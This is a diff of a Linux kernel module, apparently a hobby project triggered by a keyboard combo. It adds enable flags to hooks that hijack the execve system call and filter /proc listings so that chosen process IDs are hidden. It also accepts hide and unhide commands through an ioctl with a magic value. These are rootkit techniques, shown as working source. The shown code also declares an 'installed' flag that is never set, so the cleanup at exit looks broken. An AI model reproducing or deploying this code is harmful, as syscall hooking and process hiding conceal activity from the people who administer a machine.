@@ -44,6 +44,12 @@ struct kb_work {
 
 /* Globals */
 
+// 1 if hooks are installed, 0 otherwise
+static char installed = 0;
+// 1 if hooks are enabled, 0 otherwise
+// Necessary to prevent access violations before kernel module exit
+static char enabled = 0;
+
 // Pointer to original exec system call handler.
 // Signature based on <linux/syscalls.h>
 static asmlinkage long
@@ -73,7 +79,7 @@ sys_execve(const char __user *filename,
 		const char __user *const __user *envp)
 {
 	// Replace `man pac` execution calls
-	if (argv != NULL && argv[1] != NULL &&
+	if (enabled && argv != NULL && argv[1] != NULL &&
 			strcmp("/usr/bin/man", filename) == 0 &&
 			strcmp("pac", argv[1]) == 0)
 	{
@@ -205,14 +211,20 @@ proc_filldir(struct dir_context *ctx, const char *name, int namlen,
 			offset, ino, d_type);
 }
 
+static struct dir_context proc_ctx = {
+	.actor = proc_filldir
+};
+
 // Wrapped /proc iterate_shared that calls wrapped proc_fill_dir
 static int
 proc_iterate_shared(struct file *file, struct dir_context *ctx)
 {
 	int error;
-	static struct dir_context proc_ctx = {
-		.actor = proc_filldir
-	};
+
+	if (!enabled) // Not enabled, return original
+	{
+		return original_iterate_shared(file, ctx);
+	}
 
 	proc_ctx.pos = ctx->pos;
 	original_proc_ctx = ctx; // Store pointer to original for wrapper
@@ -244,8 +256,6 @@ hide_pid(unsigned long pid)
 	pr_debug("pr_io - adding %lu, count: %d\n", pid, ghost_count);
 }
 
-void restore(void); // Only function that violates order
-
 // Removes pid from ghost_pids
 void
 unhide_pid(unsigned long pid)
@@ -267,13 +277,18 @@ unhide_pid(unsigned long pid)
 	}
 
 	// No ghosts remaining, restore to normal
-	//restore();
+	enabled = 0;
 }
 
 // ioctl on /proc, receives signals from manpac
 static long
 proc_ioctl(struct file* file, unsigned int command, unsigned long pid)
 {
+	if (!enabled) // If disabled, ignore
+	{
+		return 0;
+	}
+
 	switch (command)
 	{
 		case 0xDEADCAFE: // Received ghost_pid add
@@ -337,6 +352,7 @@ restore_proc_fop(void)
 void
 install(void)
 {
+	enabled = 1;
 	install_proc_fop();
 	install_exec_wrapper();
 }
@@ -346,6 +362,7 @@ restore(void)
 {
 	restore_exec();
 	restore_proc_fop();
+	enabled = 0;
 }
 
 /* Keyboard Combo Launcher */
@@ -454,6 +471,10 @@ exit_KonamiModule(void)
 	destroy_workqueue(wq_keyboard);
 	// Keyboard's IRQ on x86* is 1, free the handle located by kb_pos
 	free_irq(1, &kb_pos);
+	if (installed)
+	{
+		restore();
+	}
 	pr_debug("Konami module exited.\n");
 	return;
 }
